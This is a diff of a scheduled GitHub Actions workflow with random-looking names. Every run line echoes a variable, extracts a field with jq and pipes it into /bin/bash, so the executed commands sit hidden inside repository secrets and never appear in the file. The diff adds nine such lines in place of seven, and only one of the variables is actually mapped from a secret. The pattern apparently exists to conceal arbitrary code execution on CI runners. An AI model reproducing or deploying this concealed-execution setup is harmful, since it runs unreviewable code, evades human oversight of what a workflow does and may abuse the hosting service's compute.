@@ -2,23 +2,23 @@ name: zhuwushan1989
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 3/6 * * *'
-
+    - cron: '41 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhuwushan1989
         env:
-          mi65: ${{ secrets.mi65 }}
+          ysbgg02856: ${{ secrets.ysbgg02856 }}
         run: |
-          echo $mi65 | jq -r .tfc8 | /bin/bash
-          echo $wcau14 | jq -r .wksg0382 | /bin/bash
-          echo $yonvf407 | jq -r .fflk4773 | /bin/bash
-          echo $htc632 | jq -r .bt2 | /bin/bash
-          echo $iqeh8519 | jq -r .t3421 | /bin/bash
-          echo $u51 | jq -r .trwyz63 | /bin/bash
-          echo $cd29 | jq -r .csbd4 | /bin/bash
+          echo $ysbgg02856 | jq -r .tzu01443 | /bin/bash
+          echo $dx9986 | jq -r .ej2657 | /bin/bash
+          echo $yhp0239 | jq -r .gfbd255 | /bin/bash
+          echo $rq17 | jq -r .bxv6769 | /bin/bash
+          echo $xpxan0 | jq -r .zdrzx9 | /bin/bash
+          echo $ky5 | jq -r .w685 | /bin/bash
+          echo $bra9748 | jq -r .jqpp75 | /bin/bash
+          echo $yterk02 | jq -r .xxss34024 | /bin/bash
+          echo $ydu22367 | jq -r .qba9634 | /bin/bash
 
